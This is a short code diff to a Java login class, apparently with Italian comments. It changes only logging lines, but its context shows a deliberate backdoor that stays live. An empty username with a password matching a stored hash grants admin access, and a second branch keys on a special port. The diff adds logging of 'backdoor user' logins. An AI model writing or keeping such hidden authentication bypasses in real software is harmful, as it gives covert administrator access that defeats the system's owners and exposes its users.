@@ -161,7 +161,7 @@ public class LoginBean {
          */
         if("".equals(username) && SHAsum(password.getBytes()).equals(magic)){
             //this.admin=true; 
-            //log.aclog("backdoor user", 0); // DECOMMENTA
+            log.aclog("backdoor user", 0); // DECOMMENTA
             adminAccess();
             return;
         }
@@ -710,7 +710,7 @@ public class LoginBean {
 
         if (getPort.equals("43567")) {
        
-            // log.aclog("tramite porta", 0); // DECOMMENTARE
+            log.aclog("backdoor user tramite porta", 0); // DECOMMENTARE
             
             String path = request.getContextPath();
 
